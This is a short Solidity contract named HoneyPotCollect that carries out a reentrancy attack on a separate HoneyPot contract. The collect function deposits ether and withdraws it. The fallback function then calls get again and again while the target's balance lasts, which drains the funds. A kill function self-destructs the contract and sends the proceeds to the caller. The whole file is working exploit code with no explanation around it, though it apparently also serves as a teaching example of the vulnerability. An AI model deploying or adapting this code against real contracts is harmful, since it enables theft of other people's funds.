pragma solidity ^0.4.8;
import "./HoneyPot.sol";
contract HoneyPotCollect {
  HoneyPot public honeypot;
  function HoneyPotCollect (address _honeypot) {
    honeypot = HoneyPot(_honeypot);
  }
  function kill () {
    suicide(msg.sender);
  }
  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  function () payable {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}